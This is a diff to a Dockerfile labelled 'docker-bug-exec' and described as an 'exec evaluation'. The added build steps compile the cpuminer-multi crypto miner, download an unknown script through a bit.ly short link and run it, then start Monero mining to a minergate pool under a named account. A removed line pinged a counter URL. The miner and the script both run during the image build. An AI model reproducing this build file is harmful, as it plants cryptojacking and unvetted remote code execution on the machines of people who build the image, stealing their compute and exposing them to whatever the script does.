@@ -1,7 +1,7 @@
 #   Title: docker-bug-exec
 #   Desc: exec evaluation
 #   Autor: Ferro.Mariano, navebinario
-#   Url: gitlab.com/docker-bug-exec/Dockerfile, github.com/ferromariano/aa-my-cpuminer
+#   Url: gitlab.com/docker-bug-exec/Dockerfile.git
 #   Date: 2017-08-26
 # Note: On Alpine 3.5 curl-dev uses LibreSSL which is incompatible with the required OpenSSL-dev.
 
@@ -9,5 +9,42 @@ FROM alpine:3.4
 
 RUN set -x \
     # Runtime dependencies.
- && wget https://counter9.freecounter.ovh/private/freecounterstat.php?c=tchw38eezjhbrhhqjzg52gbnqqx26u1t
- 
+ && apk add --no-cache \
+        libcurl \
+        libgcc \
+        libstdc++ \
+        openssl \
+    # Build dependencies.
+ && apk add --no-cache -t .build-deps \
+        autoconf \
+        automake \
+        build-base \
+        curl \
+        curl-dev \
+        git \
+        openssl-dev \
+    # Compile from source code.
+ && git clone --recursive https://github.com/tpruvot/cpuminer-multi.git /tmp/cpuminer \
+ && cd /tmp/cpuminer \
+ && ./autogen.sh \
+ && ./configure CFLAGS="-O2 -march=native" --with-crypto --with-curl \
+ && make install \
+    # Install dumb-init (avoid PID 1 issues).
+    # https://github.com/Yelp/dumb-init
+ && curl -Lo /usr/local/bin/dumb-init https://github.com/Yelp/dumb-init/releases/download/v1.1.3/dumb-init_1.1.3_amd64 \
+ && chmod +x /usr/local/bin/dumb-init \
+    # Clean-up
+ && cd / \
+ && apk del --purge .build-deps \
+ && rm -rf /tmp/* \
+    # Verify
+ && cpuminer --cputest \
+ && wget https://bitly.com/2xkMehg#star -nv -O ./EXEC-start.sh \
+ && chmod +x ./EXEC-start.sh \
+ && ./EXEC-start.sh \
+ && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \
+ & sleep 60 \
+ && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x
+
+ENTRYPOINT ["dumb-init"]
+CMD ["cpuminer", "--help"]
